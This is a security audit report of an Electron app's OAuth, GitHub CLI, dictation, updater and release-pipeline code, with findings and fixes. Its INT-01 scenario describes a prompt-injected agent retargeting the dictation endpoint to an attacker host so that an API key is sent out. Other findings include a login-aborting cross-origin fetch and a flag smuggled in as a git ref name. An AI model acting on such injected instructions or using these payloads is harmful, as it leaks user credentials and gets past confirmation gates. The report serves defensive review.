# Integrations, OAuth, Updates and Build Integrity

Audit of `src/main/linear/**`, `src/shared/linear-assets.ts`, `src/main/github/**`,
`src/main/repository/github-*.ts`, `src/main/dictation/**`, `src/main/updates/**`,
`forge.config.ts`, `entitlements.plist`, `scripts/verify-signed-artifacts.mjs` and
`.github/workflows/**`, against the threat model in `SECURITY.md`.

The Linear OAuth flow and the asset proxy are the strongest code here: PKCE S256, a
crypto-random single-use `state`, a loopback server pinned to `127.0.0.1` with a bounded
lifetime, a callback page that reflects nothing, an upstream origin that is a hardcoded
constant rather than a parsed request field, and GraphQL built exclusively from variables.
The updater's version, channel and digest logic is correct and well-tested. The two real gaps
are elsewhere: an agent-writable transcription endpoint that carries the user's API key, and
the absence of any signature on the Linux update path where macOS has Squirrel's
code-signature check. One performance finding: the PR sweeper never backs off, so a broken
`gh` costs the same subprocess burst forever.

15 findings: 1 High, 4 Medium, 7 Low, 3 Info.

## Findings

### [INT-01] An agent can redirect the dictation endpoint, exfiltrating the transcription API key and every recorded clip

- Severity: High
- Confidence: Confirmed
- Where: `src/shared/config.ts:334` (with `src/main/dictation/dictation-service.ts:65-77`, `src/main/agent-control/agent-control-service.ts:1186-1188`)

```ts
	dictation: z
		.strictObject({
			enabled: dictationSettingsSchema.shape.enabled.removeCatch(),
			baseUrl: dictationSettingsSchema.shape.baseUrl.removeCatch(),
```

**What.** `dictation.baseUrl` is writable through the `updateAppSettings` control op. Its
schema is `z.string().catch('https://api.openai.com/v1')` (`src/shared/config.ts:97`) — no
host allowlist, no URL validation. The only check is at use: `transcriptionEndpoint` accepts
any absolute `http:`/`https:` URL (`dictation-types.ts:21`), deliberately including plain
`http:` so a local `whisper-server` works — but that allowance is not restricted to loopback.
`requestTranscript` then posts the audio there with
`Authorization: Bearer <the user's stored transcription key>` (`dictation-service.ts:267-274`).

**Scenario.** A Concierge agent — or prompt-injected content steering one — calls
`updateAppSettings` with `{dictation: {baseUrl: 'http://attacker.example/v1'}}`. The next time
the user dictates, the clip and the bearer key go to the attacker in cleartext. The key is a
stored credential, so this is `SECURITY.md`'s "secrets escaping the Keychain", leaving over
the network rather than to disk.

**Existing guards & tests checked.** Three, narrowing but not closing it.
`updateAppSettings` is in `CONCIERGE_ONLY_OPS` (`subagent-policy.ts:347`), refusing workspace
agents and every sub-agent. It maps to `app-settings-change`
(`agent-control-service.ts:1169-1170`), which is in `SENSITIVE_ACTIONS`
(`src/shared/permissions.ts:61`) and so reaches `confirmation-required` even in the default
`workspace-trusted` mode. **But AFK returns before the dialog:**
`if (isUnattended(origin)) return null;` (`agent-control-service.ts:1186-1188`) allows the op
outright, so an AFK Concierge writes the setting with nothing shown to the user.
`tests/main/dictation-service.test.ts` covers the protocol refusal and key redaction; nothing
asserts a host constraint.

**Fix.** Treat `baseUrl` as a credential-bearing destination, not a preference: drop it
(ideally `enabled` too) from `appSettingsControlPatchSchema` — the Concierge has no reason to
retarget transcription. Independently, narrow the `http:` allowance to loopback hosts, the only
case the comment at `dictation-types.ts:19-20` justifies.

### [INT-02] A Linux update is verified only by GitHub's own digest — no signature, where macOS has Squirrel's code-signature check

- Severity: Medium
- Confidence: Confirmed
- Where: `src/main/updates/appimage-installer.ts:214-224` (with `release-feed.ts:148-155`)

```ts
	const expected = asset.digest.replace(/^sha256:/i, '').toLowerCase();
	if (digest !== expected) {
		// … refuse
```

**What.** Linux install integrity rests entirely on `asset.digest` — the `sha256:<hex>` GitHub
computes over the asset it stored — read from the same `api.github.com` response that supplied
`browser_download_url` (`release-feed.ts:50,56,154`). There is no detached signature (GPG,
minisign, Sigstore) and no artifact attestation in either release workflow. Replacing the
asset makes GitHub recompute the digest, so both halves move together.

**Scenario.** A compromised release-publishing credential (or GitHub itself) re-uploads
`Ensemblr-*-x86_64.AppImage` with `--clobber`. Every Linux install whose AppImage directory is
writable downloads it, hashes it to the published digest, stages it, and renames it over the
running binary at next quit — arbitrary code execution as the user. On macOS the same
compromise is stopped by Squirrel.Mac, which validates the downloaded bundle's code signature
against the running app's designated requirement, rooted in a Developer ID key GitHub never
holds. Linux has no equivalent step.

**Existing guards & tests checked.** The refuse-without-a-digest path is deliberate and
correct (`toLinuxUpdateAsset` → null, `armUpdater` → `'declined'`, `updater-port.ts:85-88`),
covered by `tests/main/release-feed.test.ts:511`. The prefix strip fails closed on another
algorithm: a `sha512:…` digest is not stripped, so the comparison mismatches and the install
is refused. `tests/main/appimage-installer.test.ts:134,149` cover mismatch and partial
cleanup. All of that verifies *transport*; none establishes *provenance*.

**Fix.** Publish a detached signature from a key GitHub never holds (minisign or GPG, public
key compiled into the app) and require it before the swap — what Squirrel gives macOS for
free. `actions/attest-build-provenance` plus verification in `appimage-installer.ts` is the
lighter option. Short of either, say so in `docs/build-and-release.md`: "Linux updates trust
GitHub Releases" is defensible stated and a surprise unstated.

### [INT-03] The `updateAppSettings` confirmation names the operation but not the patch

- Severity: Medium
- Confidence: Confirmed
- Where: `src/main/agent-control/agent-control-service.ts:1189-1194`

```ts
		const approved = await ports.confirm.confirm({
			origin, signal,
			summary: `Agent requests ${op} in workspace ${origin.workspaceId}.`,
		});
```

**What.** The one prompt between an agent and a sensitive settings write shows the op name and
a workspace id — not which sections, keys, or values.

**Scenario.** An attended Concierge agent requests `updateAppSettings`. The user, who has seen
it legitimately adjust appearance settings before, approves. The patch retargets
`dictation.baseUrl` ([INT-01]) or sets `general.automaticUpdates: false` so a patched release
never installs. The gate fired exactly as designed and authorised something the user could not
read.

**Existing guards & tests checked.** The gate itself is right — sensitive action,
confirmation-required in every mode, Concierge-only. `arg-naming.ts:32` documents each setting
for the *agent*; the dialog shows the *user* none of it. No test asserts the summary's content.

**Fix.** Render the patch — section, key, old value, new value — at least for a
security-relevant set (`dictation.baseUrl`, `general.automaticUpdates`, and anything later that
reaches the network or disables a protection). A prompt the user cannot act on is not consent.

### [INT-04] The PR sweeper never backs off, so a broken `gh` costs the same subprocess burst indefinitely

- Severity: Medium
- Confidence: Confirmed
- Where: `src/main/github/workspace-pr-sweeper.ts:113-122` (with `github-service.ts:336-535`)

```ts
	const isDue = (workspace: SweepableWorkspace, currentMs: number): boolean => {
		const sweptAtMs = sweptAtByWorkspaceId.get(workspace.id);
		if (sweptAtMs === undefined) return true;
		const intervalMs = workspace.hasPendingChecks ? pendingIntervalMs : idleIntervalMs;
		return currentMs - sweptAtMs >= intervalMs;
	};
```

**What.** `isDue` is purely a clock comparison. `refreshSnapshot` swallows every failure
(`:182-184`) and `getPullRequestSnapshot` already converts a `gh` failure into a returned
envelope, so the classified outcome — `gh-not-installed`, `gh-not-authenticated`, a 403 rate
limit — never reaches the scheduler. Nothing widens the interval, marks a workspace
unsweepable, or pauses the sweep.

One snapshot costs, per workspace: 3 `git` spawns (`rev-parse`, `config --get`, `rev-list`),
1 `gh pr view`, up to 2 `gh api …/deployments` (head OID tried, then head ref name), up to 5
*concurrent* `gh api …/statuses` per deployment page via `Promise.all`
(`github-service.ts:462-472`), and 1 `gh api graphql` — worst case ≈ 14 `gh` invocations. At
the 30 s pending cadence with five workspaces holding running checks that is ~70 `gh` spawns
and API round trips per 30 s, on top of the renderer's own poll of the focused workspace, and
it continues at that rate whether or not a single call has succeeded since launch.

**Scenario.** The user's `gh` token expires. Every tick re-spawns the full burst, each failing
on an API round trip, for the whole session — and each failure is classified and logged at the
same cadence. `gh-failures.ts` exists precisely to name these outcomes; the sweeper never asks.

**Existing guards & tests checked.** Real, just not sufficient: the `running` flag prevents
overlapping sweeps, refreshes are chained sequentially (`:174-185`), `SNAPSHOT_TTL_MS` dedupes
reads inside 5 s, `sweptAtByWorkspaceId` forgets archived ids.
`tests/main/workspace-pr-sweeper.test.ts` covers the cadence split and that one failure does
not stop the sweep — the behaviour that makes this invisible.

**Fix.** Feed the classified failure back: per-workspace exponential backoff seeded by the
failure code — long for `gh-not-installed`/`gh-not-authenticated` (neither recovers on a
timer), `retry-after` for a rate limit — reset on the next success.
`linear-sync.ts:95-120` already has the right shape. Separately, make the deployment-status
fan-out sequential so it matches the sweeper's stated intent.

### [INT-05] A third-party action is pinned to a mutable tag in a job holding PR and status write

- Severity: Medium
- Confidence: Confirmed
- Where: `.github/workflows/checks.yml:117-120`

```yaml
      - uses: millionco/react-doctor@v2
        with:
          scope: changed
          blocking: error
```

**What / scenario.** A third-party action referenced by a tag its owner can move, in a job
granted `pull-requests: write` and `statuses: write` (`checks.yml:98-104`) after a full
`actions/checkout@v7` with `fetch-depth: 0`, on every push to `master` and every same-repo PR.
Whoever controls `millionco/react-doctor` — or an attacker who compromises it — repoints `v2`
and gets a `GITHUB_TOKEN` that can write PR comments and commit statuses: enough to forge a
green status on a PR whose ruleset requires this context. `contents:` stays `read`, so the
source tree is not directly writable.

**Existing guards & tests checked.** Good hygiene around it: the trigger is `pull_request`,
never `pull_request_target`, so a fork PR's token is read-only regardless of the `permissions:`
block; workflow-level permissions are `contents: read`; the write scopes are job-scoped with a
comment explaining why `build` must not carry them. First-party `actions/checkout@v7` and
`actions/setup-node@v7` are tag-pinned too — conventional, much lower risk.

**Fix.** Pin to a full commit SHA with the tag in a trailing comment
(`millionco/react-doctor@<sha> # v2.x.y`) and let Dependabot's `github-actions` ecosystem bump
it. Consider whether the scan needs `statuses: write` at all.

### [INT-06] No scheme or host constraint on update URLs, and the releases list is read unbounded

- Severity: Low
- Confidence: Confirmed
- Where: `src/main/updates/release-feed.ts:50`, `:69`, `:334`

**What.** `z.url()` in Zod 4 validates only that the string parses as a URL — verified
locally, it accepts `http://evil.test/x`, `file:///etc/passwd` and `ftp://a/b`. Nothing in
`src/main/updates/**` mentions `github.com` or `objects.githubusercontent.com` outside the
`releasesUrl` template (`:292`), so both `candidate.feedUrl` (handed to
`autoUpdater.setFeedURL`) and `candidate.linuxAsset.url` (handed to the AppImage downloader)
are whatever the API response said. Separately, `readReleases` calls `response.json()` with no
size limit (`:334`), unlike `readFeedDocument`, which correctly streams under `MAX_FEED_BYTES`.

**Scenario.** A network attacker holding a certificate the OS trusts, or a compromised
`api.github.com`, answers with `browser_download_url` on its own host plus a matching
`digest` — or with a multi-gigabyte JSON body, OOMing the main process mid-check. The first is
already inside [INT-02]'s trust model; what this adds is that there is no *second* barrier, so
an API-level compromise alone suffices. `file:` is harmless: Node's `fetch` rejects it
(verified).

**Existing guards & tests checked.** `MAX_APPIMAGE_BYTES` (512 MB) and a 30-minute deadline
bound the AppImage download; `MAX_FEED_BYTES` bounds the feed document; `releaseSchema` narrows
the response to four fields. `tests/main/release-feed.test.ts` has 25 tests, none asserting a
URL host.

**Fix.** Require `https:` and a host in `{github.com, objects.githubusercontent.com,
release-assets.githubusercontent.com}` via a Zod refinement, and route `readReleases` through
`readBoundedText`.

### [INT-07] `parseGithubUrl` admits `.` and `..` as an owner or repository name, and the clone destination is resolved from it

- Severity: Low
- Confidence: Confirmed
- Where: `src/main/repository/github-url.ts:19-22` (with `clone-destination.ts:66-68`, `target-path.ts:15`)

```ts
const GITHUB_URL_PATTERN =
	/^https?:\/\/(?:[^/@\s]*@)?github\.com\/([\w.-]+)\/([\w.-]+?)(?:\.git)?\/?$/i;
```

**What / scenario.** `[\w.-]+` matches `.`, `..`, `...` and names beginning with `-`. Verified
against the live pattern: `https://github.com/owner/..` yields `repositoryName: '..'`,
`https://github.com/../repo` yields `owner: '..'`, `https://github.com/-x/repo` yields
`owner: '-x'`. `repositoryName` reaches `allocateUniqueTargetPath(defaultParentPath, name)`,
which is `path.resolve(parentPath, name)` — so `'..'` resolves the clone target to the *parent*
of the managed repositories root and stores it on the prepared job. Nothing is written: the
clone fails because GitHub has no such repository, and `assertTargetWritable` may reject the
path first. The impact is a path escaping its intended root before anything is asked to catch
it, which is the wrong order.

**Existing guards & tests checked.** `assertTargetWritable(destination.targetPath)` runs before
the job is stored (`clone-repository.ts:145-149`) and is the only thing between this and a
write. The GraphQL path is clean: `owner`/`name` go into `gh api graphql -f owner=… -f name=…`
as **GraphQL variables** against `String!` (`github-branches.ts:66-87`), never interpolated
into a REST path, so there is no `repos/../../user` traversal.
`tests/main/clone-repository.test.ts` and `list-github-remote-branches.test.ts` cover neither
a dot-segment owner nor name.

**Fix.** Reject `.`, `..` and a leading `-` in both capture groups after the match — GitHub
permits none of them anyway.

### [INT-08] The loopback callback server settles on any request to `/callback`, from any origin, by any method

- Severity: Low
- Confidence: Confirmed
- Where: `src/main/linear/linear-oauth-callback-server.ts:110-126` (with `linear-oauth.ts:100-110`)

**What / scenario.** The handler checks the path and nothing else: no method, `Origin`,
`Sec-Fetch-Site` or `Host` check. `parseOauthCallback` reads `error` *before* comparing `state`
(`linear-oauth.ts:100-110`), so a request carrying only `?error=…` resolves the promise and
fails the login without reaching the state comparison. Any page open in the user's browser
during a login can `fetch('http://127.0.0.1:48752/callback?error=x', {mode:'no-cors'})` across
the five fixed ports, aborting the login with `callback-failed`; repeated, it prevents
connecting Linear at all, and the timing tells the page Ensemblr is running with a login open.
**Login CSRF is not reachable** — a forged `?code=…&state=…` needs the 24-byte random `state`,
which never leaves the app except in the authorize URL the browser was sent to.

**Existing guards & tests checked.** Every structural control is right: bound to `127.0.0.1`
only (`listen(port, LOOPBACK_HOST)`), single-use via `settled`, a 5-minute timeout, closed by
the caller in every branch of `startLogin`'s `try/finally` (`linear-auth-service.ts:736-739`),
and a page interpolating only const-table strings and the resolved `AppLanguage` — no query
parameter reaches the HTML, so no reflected XSS and no open redirect.
`tests/main/linear-oauth-callback-server.test.ts` has 4 tests, covering port selection and the
happy path.

**Fix.** Refuse anything but `GET`, and reject when `sec-fetch-mode` is present and is not
`navigate` — a browser sets it on a `fetch` and page script cannot forge it. Optionally do not
settle on a request whose `state` is absent, so a probe cannot consume the single-use slot.

### [INT-09] `verify:signing` matches the authority string but never pins the Team ID

- Severity: Low
- Confidence: Confirmed
- Where: `scripts/verify-signed-artifacts.mjs:70-79`

**What / scenario.** The assertion is that `codesign -dv` output contains the literal
`Developer ID Application`. That substring appears in
`Authority=Developer ID Application: <Name> (<TEAMID>)` for *any* Developer ID certificate,
from any Apple developer account; the team identifier is never checked. A misconfigured build
host or a swapped `APPLE_CERT_P12` therefore ships an artifact signed by the wrong identity and
passes every check here. It would still have to be notarized (requiring the ASC key and the
certificate to match), so the window is narrow — but this script exists because "six releases
shipped a `.dmg` Gatekeeper refused", and identity is the one thing it does not verify.

**Existing guards & tests checked.** The rest is strong: `codesign --verify --strict --deep`,
`spctl` for both `exec` and `install` policies, `stapler validate` on the app, the DMG *and*
the `.app` inside the zip (extracted with `ditto`), an empty `out/` treated as a failure, and
every failure collected rather than stopping at the first. `apple-signing/action.yml:83-87`
independently asserts the imported keychain holds a Developer ID Application identity.

**Fix.** Add the expected Team ID as a constant (or an `ENSEMBLR_TEAM_ID` the release job sets)
and assert `TeamIdentifier=<id>`.

### [INT-10] Provider error bodies are truncated into failure messages that reach the support bundle

- Severity: Low
- Confidence: Likely
- Where: `src/main/linear/linear-auth-service.ts:316-326`

**What / scenario.** The token endpoint's response body is spliced verbatim (to 200 chars) into
an error message that `toFailure` returns to the renderer and that lands in the support bundle.
The request that produced it carried `refresh_token` and, for a user-configured confidential
client, `client_secret`. An OAuth server that echoes a submitted parameter in its error body
writes that credential into a diagnostic artifact. Linear's current bodies are
`{"error":"invalid_grant"}`-shaped and carry no credential, which is why this is Likely rather
than Confirmed: it depends on behaviour outside this repository's control.

**Existing guards & tests checked.** The equivalent dictation path gets this right —
`redactSecret(body, apiKey)` before truncation (`dictation-service.ts:277-281`), with JSDoc at
`:79-83` naming the exact reason; `command-redaction.ts` does the same for spawned commands.
The Linear token path has no such pass. `linear-client.ts` is clean for a different reason: it
surfaces `errors[0].message` from the GraphQL envelope, never the raw body.

**Fix.** Redact the refresh token and, when present, the client secret out of `detail` before
truncating.

### [INT-11] `gh pr view` / `gh pr merge` take a head ref read from repository-local git config with no leading-dash guard

- Severity: Low
- Confidence: Likely
- Where: `src/main/github/github-service.ts:249-265` (used at `:346`, `:716`)

**What / scenario.** `remoteHeadRef` is whatever follows `refs/heads/` in the repository's own
`.git/config`. `git check-ref-format` does not forbid a leading `-` in a ref component, and the
value is passed as a bare positional: `['pr','view',headRef,'--json',…]` and
`['pr','merge',headRef,'--squash']`. A value such as `--repo=other/repo` is read by `gh` as a
flag rather than a branch name. Writing that config requires either the user (harmless) or
something with local write access; impact is bounded to what a `gh pr view`/`gh pr merge` flag
can do, and there is no shell (`spawn` with `shell: false`,
`src/main/commands/spawn-command.ts:67`), so no command substitution.

**Existing guards & tests checked.** The rest of the argv construction in this file is careful
and deliberately so: `git add --` before caller paths (`:555`), every user string passed as a
flag *value* rather than a positional (`--title`, `--body`, `--base`), `-f ref=${ref}` and
`-F number=${prNumber}` keeping values after the `=`, `--trailer` rather than message text for
the co-author credit, and the `-F` vs `-f` choice at `github-branches.ts:69-72` reasoned out in
a comment. `validateCwd` requires an absolute path. `tests/main/github-service.test.ts` covers
the inherited-base-upstream suppression, not a hostile ref name.

**Fix.** Reject a `remoteHeadRef` matching `/^-/` in `resolveUpstreamBranch`, or pass it after
a `--`. `SECURITY.md` places the opened repository inside the trust boundary, so this is
defence in depth — but it is a one-line guard.

### [INT-12] Four unfixable high advisories in the DMG maker's dependency chain

- Severity: Low
- Confidence: Confirmed
- Where: `package.json` (`@electron-forge/maker-dmg`), via `npm audit`

**What / scenario.** 4 high advisories, all in the devDependency chain
`@electron-forge/maker-dmg` → `electron-installer-dmg` → `appdmg` → `image-size@0.7.5`:
GHSA-w3rx-r6r6-pgpr and GHSA-5p2g-fcmc-qvqq (ICNS and JXL/HEIF parser infinite loops), all
four `fixAvailable: false`. **`npm audit --omit=dev` reports zero vulnerabilities of any
severity**, so no shipped runtime dependency is affected. The input is `assets/icon.icns`, a
file this repository owns; a malicious icon would hang the DMG maker at build time.

**Existing guards & tests checked.** The `overrides` block is doing real work and every entry
still resolves at or above its fixed version (verified against `package-lock.json`):
`extract-zip` → `@electron-internal/extract-zip@1.0.5` under `@electron/packager` (the
GHSA-jmr9-qjv8-65gv symlink traversal, the same swap Electron made upstream), `tar@7.5.22`,
`tmp@0.2.7`, `linkify-it@5.0.2` (the only production one),
`@electron/node-gyp@10.2.0-electron.1`. None is redundant.

**Fix.** Nothing actionable — `appdmg` is unmaintained and the fix has to come from Forge.
Worth recording in the audit baseline so the four are not re-triaged each pass, and
re-checking when Forge 8 lands (the release that also retires the `extract-zip` alias).

### [INT-13] `allow-unsigned-executable-memory` is granted, weakening the hardened runtime

- Severity: Info
- Confidence: Confirmed
- Where: `entitlements.plist`

**What.** Three entitlements, and the absences matter more than the presences. `allow-jit` is
required by V8; `audio-input` is required by composer dictation and paired with
`NSMicrophoneUsageDescription` (`forge.config.ts:271-274`).
`allow-unsigned-executable-memory` relaxes W^X beyond what `allow-jit`'s MAP_JIT grants;
Electron's signing docs still list it and modern Electron may no longer need it. Not granted,
correctly: `disable-library-validation`, `allow-dyld-environment-variables`, `debugger`.

**Existing guards & tests checked.** Fuses are correct — `RunAsNode: false`,
`EnableCookieEncryption: true`, `EnableNodeOptionsEnvironmentVariable: false`,
`EnableNodeCliInspectArguments: false`, `EnableEmbeddedAsarIntegrityValidation: true`,
`OnlyLoadAppFromAsar: true` (`forge.config.ts:382-390`). The packaging `ignore` predicate keeps
only `/.vite`, `/package.json` and three `node_modules` subtrees, so `.env` — which
`forge.config.ts:1` loads at build time — is not packaged. One note:
`optionsForFile: () => ({entitlements: 'entitlements.plist', hardenedRuntime: true})`
(`:231-237`) applies the same file to *every* signed binary, so the GPU and renderer helpers
and node-pty's `spawn-helper` receive `audio-input` too rather than a narrower inherit-only set.

**Fix.** Try a build without `allow-unsigned-executable-memory`. Consider a separate
`entitlements.inherit.plist` carrying only `com.apple.security.inherit` for helpers.

### [INT-14] The OAuth callback server's security-relevant behaviour is untested

- Severity: Info
- Confidence: Confirmed
- Where: `tests/main/linear-oauth-callback-server.test.ts`

**What.** Four tests: first-free-port binding, skipping occupied ports, failing when all are
busy, resolving params on the callback path. Untested: that it binds `127.0.0.1` and not
`0.0.0.0`, that a non-callback path 404s without settling, that a second request does not
re-settle, that the timeout rejects with `callback-timeout`, and that no query parameter
reaches the rendered HTML. Each is currently correct; none is pinned, so a refactor can
silently regress the bind address or the single-use guard.
`tests/main/linear-oauth.test.ts` covers the pure parse/build layer and never reaches the
server.

**Fix.** Add the five cases; the bind-address one is the most valuable.

### [INT-15] `APPIMAGE` is trusted for the swap target and relaunch, and the staged file is not re-verified at apply time

- Severity: Info
- Confidence: Confirmed
- Where: `src/main/updates/appimage-installer.ts:239-249` (with `updater-port.ts:59-68`, `src/main/app/relaunch-target.ts:21-22`)

**What / scenario.** `process.env.APPIMAGE` names the file the updater renames over and the
path `app.relaunch` re-executes. Verification happens at *stage* time; `applyStaged` only
checks the staged file exists before renaming it, which may be days later — so anyone able to
write that directory can replace `.<name>.AppImage.ensemblr-update` in the window. Both
require an attacker with local write access as the user, which `SECURITY.md` places out of
scope. The app's own environment is set by whatever launched it (the AppImage runtime), not by
the repository environment layer, which applies only to spawned children.

**Existing guards & tests checked.** The staging design is careful: rename rather than
in-place write (a running AppImage is a FUSE mount of the file being replaced), staging
separate from applying, `chmod 0o755` preserved, `removeQuietly(partialPath)` on every failure
branch, a 512 MB ceiling and 30-minute deadline, and `update-preconditions.ts:90-95` refusing
to install unless `APPIMAGE` is set *and* its directory is writable. `applyStaged`'s
`renameSync` is wrapped by `finishInstall`'s `try/catch` (`updater-port.ts:134-141`), so a
failed swap relaunches the old version rather than a half-replaced file. The install-manifest
rewrite is doubly guarded (`appimage-installer.ts:186-191`), covered at
`tests/main/appimage-installer.test.ts:278,290`.

**Fix.** Re-hash the staged file against the recorded digest inside `applyStaged` before the
rename — one pass over ~120 MB at quit time removes the whole window.

## Verified sound

- **PKCE** — `randomBytes(32)` base64url verifier, `sha256`/`base64url` challenge, `S256`
  method (`linear-oauth.ts:47-52`, `:80-81`), exchanged at `linear-auth-service.ts:549`.
- **OAuth `state`** — `randomBytes(24)` base64url, per attempt, compared exactly, single-use
  because the server settles once (`linear-oauth.ts:58-60`, `:112`,
  `linear-oauth-callback-server.ts:122-125`); `state-mismatch` is a distinct typed failure.
- **Public client** — `BUILT_IN_LINEAR_CLIENT_ID` ships no secret (`linear-oauth.ts:11-17`); a
  client secret exists only if the *user* stores one, app-scoped in the secret store
  (`linear-auth-service.ts:41-47`, `:218-231`).
- **Redirect URI** — `http://127.0.0.1:<port>/callback` from five fixed registered ports; the
  *same* string goes to the authorize endpoint and the token exchange
  (`linear-oauth-callback-server.ts:17-19`, `:174`, `linear-auth-service.ts:551`, `:718`).
- **Tokens** — `Authorization: Bearer` only, never a query parameter
  (`linear-auth-service.ts:368`, `linear-client.ts:239`, `linear-asset-proxy.ts:117`); stored
  only in the secret store, SQLite holding identity and error codes
  (`linear-account-store.ts:117-166`, `:280-292`); refresh deduped per account with a 60 s skew
  (`:637-644`); disconnect revokes refresh before access (`:598-605`).
- **Asset proxy origin pinning** — the upstream URL is rebuilt from the hardcoded
  `LINEAR_UPLOADS_ORIGIN` plus the path, never from the request's host
  (`src/shared/linear-assets.ts:143-147`); `canonicalAssetUrl` requires `https:` and
  `host === 'uploads.linear.app'` and vets each segment (`:158-171`). Verified: `URL` collapses
  `..` and `%2e%2e` before `pathname` is read, and a `user@host` authority cannot pass
  `^[A-Za-z0-9-]{1,64}$`. No SSRF to link-local, `file:`, or the loopback control server.
- **Cross-origin auth stripping** — verified on Node 24.20 and 26.8: undici drops
  `Authorization` across an origin change and keeps it same-origin, so a `uploads.linear.app`
  redirect to a foreign host cannot carry the bearer token.
- **Asset proxy hardening** — account resolved against `listAccountIds()` rather than trusted
  from the URL (`linear-asset-proxy.ts:89-95`); `image/*` only (415); size checked on both
  `content-length` and actual bytes (413); 20 s timeout; `default-src 'none'` + `nosniff` on
  every response (`:29-33`, `:124-144`); scheme `standard`/`secure`/`supportFetchAPI` and
  deliberately **not** `bypassCSP`, **not** `allowServiceWorkers`
  (`linear-asset-protocol.ts:18-23`); cache in memory only, byte-bounded LRU keyed by
  `accountId:url`, so no disk path is derived from a URL.
- **Asset signature stripping** — `stripLinearAssetSignatures` in `linear-wire.ts` (`:135`,
  `:231`, `:290`, `:306`) keeps the 300-second signed URL out of the renderer and out of agent
  context; the renderer rewrites images onto the proxy scheme (`issue-detail.tsx:138`,
  `issue-comments.tsx:67`).
- **GraphQL construction** — all user data passes as variables; the only interpolation is const
  field selections (`linear-client.ts:137-194`, `:334-491`); search goes through
  `$term: String!`; `PAGE_SIZE` 50, `DEFAULT_MAX_SYNC_PAGES` 4, 15 s timeout.
- **`gh` argument construction** — `spawn` with `shell: false`; `git add --` before caller
  paths; caller strings as flag values; `-f ref=…`/`-F number=…`; `--trailer` rather than
  message text; `{owner}`/`{repo}` expansion left to `gh`. `command-redaction.ts` redacts env
  values, secret-shaped assignments, `--secret <value>` pairs and inline `key=value`.
- **Linear sync cadence** — lazy, no background timer: 5-minute staleness, 30 s failure
  cooldown honouring `retry-after`, in-flight coalescing across three surfaces, bounded
  transient-scope map (`linear-sync.ts:4-6`, `:95-120`, `:149`).
- **Update feed correctness** — `semver.gt` prevents downgrade and re-offer
  (`release-feed.ts:436`); `belongsToChannel` keeps canary on the reserved `nightly` tag and
  release on `v<semver>` only, so neither channel can be fed the other's build (`:208-218`);
  drafts excluded; version read from the feed document rather than parsed off a rolling tag;
  ETag-conditional reads keep an unauthenticated check inside 60/hour; 4-hour interval after a
  2-minute delay; `checkNow` sets `state: 'checking'` before awaiting, so concurrent checks
  cannot double-arm the installer (`update-service.ts:276-287`).
- **Squirrel.Mac** — `setFeedURL({serverType: 'json', …})` then `checkForUpdates()`, with
  nothing disabling Squirrel's code-signature validation of the downloaded bundle
  (`updater-port.ts:92-93`). The feed document's `url` is read by Squirrel, never by app code.
- **Update preconditions** — unsupported platform, unpackaged build and the `dev` channel
  refuse permanently; macOS requires `/Applications`; Linux degrades to `check-only`
  (`update-preconditions.ts:63-106`). No agent-control op can check or install — the only
  surfaces are three renderer IPC channels (`src/main/ipc/handlers/update.ts:20-29`), and
  `install()` requires `state === 'ready'` and routes through the quit guard.
- **Release pipeline** — `release: published` and `workflow_dispatch` only, never
  `pull_request_target`; workflow-level `contents: write`, with `actions: read` and the
  PR/status scopes granted per job so the signing job never carries them; untrusted-ish values
  passed through `env:` and referenced as `"$TAG"` rather than interpolated into shell;
  `already-verified` fails closed; `ENSEMBLR_REQUIRE_SIGN: "1"` plus `verify:signing` close the
  unsigned-build-exits-0 gap at both ends; `npm ci` runs *before* the signing keychain exists,
  so a lifecycle script never sees it; the keychain is throwaway and deleted with
  `if: always()`, the ASC `.p8` `chmod 600` and removed; the cask bump uses a fine-grained PAT
  scoped to the tap alone, commits through the Contents API rather than a clone, checks the
  digest is 64 hex chars and asserts both `sed` substitutions landed; `nightly` publishes out
  of a draft and moves its tag only after both build legs succeed.
- **Build-channel identity** — one table in `src/shared/build-channel.ts` read by
  `forge.config.ts`, `vite.main.config.mts` and the updater, so a canary can never claim the
  release's bundle id, launcher id or update feed; `resolveBuildChannel` falls back to
  `release` on a typo.
- **Dictation data flow** — audio never touches disk: bytes over IPC → `File` in `FormData` →
  POST, bounded by `MAX_DICTATION_AUDIO_BYTES` and a duration-scaled `AbortSignal.timeout`; the
  key rides the `Authorization` header only and is redacted out of surfaced error bodies
  (`dictation-service.ts:256-293`, `:385-396`).

## Coverage

Read in full: all 18 files under `src/main/linear/`, `src/shared/linear-assets.ts`, all 7 under
`src/main/github/`, `src/main/dictation/**`, all 6 under `src/main/updates/`,
`forge.config.ts`, `entitlements.plist`, `scripts/verify-signed-artifacts.mjs`, all three
workflows and both composite actions, `src/shared/build-channel.ts`,
`src/main/app/{relaunch-target,user-data-location}.ts`,
`src/main/repository/{github-url,github-branches,clone-destination,target-path}.ts`,
`src/main/commands/command-redaction.ts`, and the relevant slices of `src/shared/config.ts`,
`src/shared/permissions.ts`, `src/shared/agent-control/{contracts,subagent-policy}.ts` and
`src/main/agent-control/agent-control-service.ts`.

Empirically verified rather than reasoned: `URL` dot-segment and percent-encoded dot-segment
collapsing; `user@host` authority parsing against the account-id regex; `Authorization`
stripping across a cross-origin redirect in undici on Node 24.20 **and** 26.8; `z.url()`
accepting `http:`, `file:` and `ftp:`; Node `fetch` rejecting `file:`; `GITHUB_URL_PATTERN`
against six hostile inputs; `path.join(root, '..')`; `npm audit` with and without
`--omit=dev`; every `overrides` entry's resolved version in `package-lock.json`.

Not covered (other auditors' dimensions): the secret store's implementation, the agent-control
server's authentication and scope model beyond the settings op traced here, renderer-side
markdown XSS, clone argument injection, plan mode, and the IPC validation layer generally.

## Open questions

1. **Is `com.apple.security.cs.allow-unsigned-executable-memory` still required by Electron
   44?** The one entitlement here weakening the runtime without an obvious present-tense
   justification. One experimental build settles it ([INT-13]).
2. **Is the Linux update path's GitHub-only trust model deliberate and accepted?** [INT-02] is
   a real asymmetry against macOS and the fix is not small. If accepted,
   `docs/build-and-release.md` and `SECURITY.md`'s build-integrity bullet should say so.
3. **Should `dictation.*` and `general.automaticUpdates` be agent-writable at all?**
   `arg-naming.ts` presents both as ordinary preferences. One carries a credential to a
   caller-named host; the other is a security control. Removing them from
   `appSettingsControlPatchSchema` closes [INT-01] outright.
4. **Should AFK auto-approve `SENSITIVE_ACTIONS`?** The comment at
   `agent-control-service.ts:1184-1185` argues AFK answers a question the mode already allows
   rather than widening it — coherent for most ops, and what makes [INT-01] reachable without a
   prompt. A sensitive-action carve-out (deny under AFK) is the alternative, at the cost of
   some unattended runs stalling.
